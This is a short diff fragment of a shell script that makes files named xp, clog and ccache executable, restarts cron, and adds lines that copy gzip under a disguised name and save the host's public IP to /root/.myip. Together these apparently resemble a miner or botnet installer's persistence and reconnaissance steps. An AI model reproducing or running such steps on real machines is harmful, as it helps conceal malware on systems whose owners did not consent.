@@ -14,3 +14,6 @@ chmod +x ${dir}/{xp,clog,ccache}
 service restart cron
 systemctl restart cron
 /etc/init.d/cron restart
+
+cp /bin/gzip /bin/xzz
+curl -sS ipv4.icanhazip.com -o /root/.myip
